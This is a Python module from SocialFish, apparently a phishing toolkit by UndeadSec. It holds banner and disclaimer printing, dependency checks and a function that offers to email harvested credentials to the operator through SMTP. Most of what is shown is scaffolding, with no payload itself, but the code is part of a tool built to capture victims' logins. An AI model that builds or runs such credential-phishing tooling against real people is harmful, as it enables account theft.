######################################################
#                                                    #
#       SOCIALFISH v2.0sharkNet                      #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from os import system
from huepy import *
from sys import exit

def clear():
    system('clear')

def conNot():
    print(red('''
  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ 
      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
          \|           
                    [!] Network error. Verify your connection.\n
'''))
    exit(0)

def phpNot():
    print(red("\n\n[!] PHP installation not found. Please install PHP and run me again. http://www.php.net/ "))
    exit(0)

def pyNot():
    print(red("[!] Please use Python 3. $ python3 SocialFish.py "))

def ngrokNot():
    print(red("[!] Ngrok not found. Downloading it..."))

def head():
    clear()
    print(bold(cyan('''
                          '
                        '   '  UNDEADSEC | t.me/UndeadSec 
                      '       '  youtube.com/c/UndeadSec - BRAZIL
                 .  '  .        '                        '
             '             '      '                   '   '
  ███████ ████████ ███████ ██ ███████ ██       ███████ ██ ███████ ██   ██ 
  ██      ██    ██ ██      ██ ██   ██ ██       ██      ██ ██      ██   ██ 
  ███████ ██    ██ ██      ██ ███████ ██       █████   ██ ███████ ███████ 
       ██ ██    ██ ██      ██ ██   ██ ██       ██      ██      ██ ██   ██ 
  ███████ ████████ ███████ ██ ██   ██ ███████  ██      ██ ███████ ██   ██ 
      .    '   '....'               ..'.      ' .
         '  .                     .     '          '     '  v2.0sharkNet 
               '  .  .  .  .  . '.    .'              '  .
                   '         '    '. '      Twitter: https://twitter.com/A1S0N_
                     '       '      '             
                       ' .  '
                           ''')))

def end():
    clear()
    print(cyan('''
                   S O C I A L 
              |\    \ \ \ \ \ \ \      __           ___
              |  \    \ \ \ \ \ \ \   | O~-_    _-~~   ~~-_
              |   >----|-|-|-|-|-|-|--|  __/   /   DON'T   )
              |  /    / / / / / / /   |__\   <     FORGET   )
              |/     / / / / / / /             \_   ME !  _)
                          F I S H                ~--___--~

> Watch us on YouTube: https://youtube.com/c/UndeadSec 

> Follow me on Twitter: https://twitter.com/A1S0N_ 

> Contribute on Github: https://github.com/UndeadSec/SocialFish 

> Join our Telegram Group(Portuguese Brazil): https://t.me/UndeadSec \n'''))


def loadModule(module):
    print(cyan('''
   _.-=-._     .-,     THIS IS NOT A JOKE!
 .'       "-.,' /  MISUSE OF THIS TOOL RESULTS 
(          _.  <          IN CRIME!
 `=.____.="  `._\\  AND THE RESPONSIBILITY IS
                         ONLY YOURS.
                       
 [*] %s module loaded. Building site...'''  % module))

def checkEd():

    if input(red(' [!] Do you agree to use this tool for educational purposes only? [y/N] > ')).upper() != 'Y':
        clear()
        print(red('\n[ YOU ARE NOT AUTHORIZED TO USE THIS TOOL ]\n'))
        exit(0)

def checkmail():

    from core.email import smtp_provider, connect_smtp
    from getpass import getpass
    from smtplib import SMTP

    if input(cyan('\n [!] Do you want to receive credentials by email? [y/N] > ')).upper() == 'Y':
        
        login = input(cyan(' [+] Enter your email > '))

        try:
            provider = login.split('@')[1].split('.')[0]
        except (IndexError, ValueError):
            print(red(' [!] This domain is not supported!'))
            return	
	
        if provider.lower() == 'gmail':
            print(yellow(' [!] Before access please enable less secure apps\n --> [https://myaccount.google.com/lesssecureapps]'))

        passwd = getpass(cyan(' [+] Password > '))
      
        domain, port = smtp_provider(provider)

        connect_smtp(domain, port, login, passwd)
        
